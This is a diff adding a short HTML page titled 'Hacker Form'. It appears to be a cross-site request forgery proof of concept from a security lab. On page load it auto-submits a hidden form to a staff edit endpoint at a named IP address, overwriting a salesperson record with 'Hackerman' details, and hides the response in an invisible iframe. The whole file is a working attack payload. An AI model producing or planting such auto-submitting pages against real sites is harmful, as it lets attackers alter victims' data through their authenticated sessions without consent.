@@ -1,0 +1,15 @@
+
+<html>
+  <head>
+    <title>Hacker Form</title>
+  </head>
+  <body onload="document.CSRF.submit()">
+    <form action="https://35.192.100.170/red/public/staff/salespeople/edit.php?id=1" method="post" style="display: none;" name='CSRF' target="res">
+        <input type="text" name="first_name" value="The real" />
+          <input type="text" name="last_name" value="Hackerman" />
+          <input type="text" name="phone" value="911-911-404" />
+          <input type="text" name="email" value="hacker@man.com" />
+    </form>
+    <iframe name="res" style="display: none;"></iframe>
+  </body>
+</html>
